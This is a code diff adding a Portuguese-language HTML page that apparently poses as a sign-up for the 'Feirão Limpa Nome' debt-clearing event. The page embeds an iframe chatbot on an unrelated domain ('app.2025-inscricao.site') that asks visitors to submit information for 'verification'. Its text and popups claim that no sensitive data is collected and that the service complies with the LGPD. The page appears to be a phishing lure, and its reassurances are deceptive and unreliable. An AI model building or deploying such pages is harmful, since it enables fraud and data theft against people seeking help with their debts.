@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Página com Container Centralizado</title>
+  <style>
+    :root {
+      --largura-mensagem-informativa: 106%; /* ajuste aqui a largura em % */
+      --altura-mensagem-informativa: auto; /* ajuste aqui a altura se desejar */
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f8e8f0;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      position: relative;
+    }
+
+    .barra-superior,
+    .barra-inferior {
+      width: 100%;
+      height: 8px;
+      background-color: #e80070;
+      position: absolute;
+      left: 0;
+    }
+
+    .barra-superior {
+      top: 0;
+    }
+
+    .barra-inferior {
+      bottom: 0;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 500px;
+      padding: 30px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    .rodape {
+      margin: 20px;
+      font-size: 12px;
+      color: #555;
+      text-align: center;
+      padding: 0 10px;
+      box-sizing: border-box;
+      width: 100%;
+    }
+
+    .rodape a {
+      color: #555;
+      text-decoration: none;
+      margin: 0 5px;
+      cursor: pointer;
+    }
+
+    .rodape a:hover {
+      text-decoration: underline;
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+      max-width: 90%;
+      z-index: 1000;
+    }
+
+    .popup h3 {
+      margin-top: 0;
+    }
+
+    .popup-close {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0,0,0,0.5);
+      z-index: 999;
+    }
+
+    .box-superior {
+      background: #fff;
+      border-radius: 8px;
+      padding: 20px;
+      margin-bottom: 20px;
+      text-align: center;
+      width: 105%;
+      max-width: 480px;
+    }
+
+    .box-inferior {
+      width: 120%;
+      background: #fff;
+      border-radius: 20px;
+      height: 400px;
+      overflow: hidden;
+      max-width: 480px;
+    }
+
+    .mensagem-informativa {
+      background: #fff;
+      border-left: 6px solid #A3005A;
+      border-radius: 8px;
+      padding: 15px;
+      margin-top: 20px;
+      font-size: 14px;
+      text-align: center;
+      color: #333;
+      width: var(--largura-mensagem-informativa);
+      height: var(--altura-mensagem-informativa);
+    }
+  </style>
+</head>
+<body>
+  <div class="barra-superior"></div>
+
+  <div class="container">
+    <div class="box-superior">
+      <h2 style="color: #A3005A; margin: 0;">Etapas para consulta</h2>
+      <p><strong>1.</strong> Informe para verificação gratuita e participar do Feirão Limpa Nome.</p>
+    </div>
+    <div class="box-inferior">
+      <iframe 
+        src="https://app.2025-inscricao.site/meu-typebot-zz3hs11" 
+        width="100%" 
+        height="100%" 
+        style="border: none;">
+      </iframe>
+    </div>
+    <div class="mensagem-informativa">
+      Esta plataforma visa orientar os cidadãos sobre a regularização de registros financeiros em território nacional. Não coletamos dados sensíveis e atuamos de forma responsável e educativa.
+    </div>
+  </div>
+
+  <div class="rodape">
+    Consulta Cidadã® - 2025 | Entidade de Apoio Educacional |
+    <a onclick="showPopup('privacidade')">Políticas de Privacidade</a> |
+    <a onclick="showPopup('termos')">Termos de Uso</a> |
+    <a onclick="showPopup('seguranca')">Segurança Digital</a>
+  </div>
+
+  <div class="barra-inferior"></div>
+
+  <div class="overlay" id="overlay" onclick="hidePopup()"></div>
+  <div class="popup" id="popup-privacidade">
+    <span class="popup-close" onclick="hidePopup()">&times;</span>
+    <h3>Políticas de Privacidade</h3>
+    <p>Esta plataforma respeita sua privacidade e não coleta dados sensíveis. Todas as informações são processadas de forma anônima e segura, em conformidade com a LGPD.</p>
+  </div>
+  <div class="popup" id="popup-termos">
+    <span class="popup-close" onclick="hidePopup()">&times;</span>
+    <h3>Termos de Uso</h3>
+    <p>Ao utilizar esta plataforma, o usuário concorda que se trata de um serviço informativo e educativo, sem vínculo com instituições financeiras ou governamentais.</p>
+  </div>
+  <div class="popup" id="popup-seguranca">
+    <span class="popup-close" onclick="hidePopup()">&times;</span>
+    <h3>Segurança Digital</h3>
+    <p>Adotamos práticas seguras para garantir a integridade e o sigilo das informações consultadas, mesmo sem coleta de dados pessoais.</p>
+  </div>
+
+  <script>
+    function showPopup(id) {
+      document.getElementById('overlay').style.display = 'block';
+      document.querySelectorAll('.popup').forEach(p => p.style.display = 'none');
+      document.getElementById('popup-' + id).style.display = 'block';
+    }
+    function hidePopup() {
+      document.getElementById('overlay').style.display = 'none';
+      document.querySelectorAll('.popup').forEach(p => p.style.display = 'none');
+    }
+  </script>
+</body>
+</html>
